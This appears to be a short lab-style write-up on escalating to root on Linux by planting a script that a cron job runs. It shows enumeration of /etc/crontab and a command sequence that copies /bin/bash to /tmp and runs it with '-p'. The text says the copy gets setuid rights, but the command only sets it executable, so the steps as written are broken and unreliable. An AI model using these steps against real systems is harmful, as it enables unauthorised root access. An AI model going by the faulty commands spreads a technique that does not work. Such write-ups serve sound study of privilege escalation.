# Escalation via Scheduled task (Cron)

## Path

### Enumeration

- We have to check in the crontab for example with `cat /etc/crontab` if we can not read this file we still could check other ways to enumerate scheduled task using [payload all the things documentation](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#scheduled-tasks) or an enumeration tool like linpeas
- In our example the system will try to run a file that does not exist (if we ls in home/user we do not see it)   
![image](https://user-images.githubusercontent.com/96747355/170375060-4d8fc104-2b34-4dc8-82e1-86eefe247b1b.png)  
- So we can try to create a file named overwrite.sh and make it escalate privileges

### Exploitation

- `echo 'cp /bin/bash /tmp/bash; chmod +x /tmp/bash' > /home/user/overwrite.sh` we create our overwrite file. Our script will create a bash with suid priv
- `chmod +x /home/user/overwrite.sh` we need to make it executable
- `/tmp/bash -p` we execute it and we get root  
![image](https://user-images.githubusercontent.com/96747355/170377045-4b98a2fb-2d52-43ea-bfc7-1b84f8d78e5a.png)  

## Wildcards

**COMING SOON**
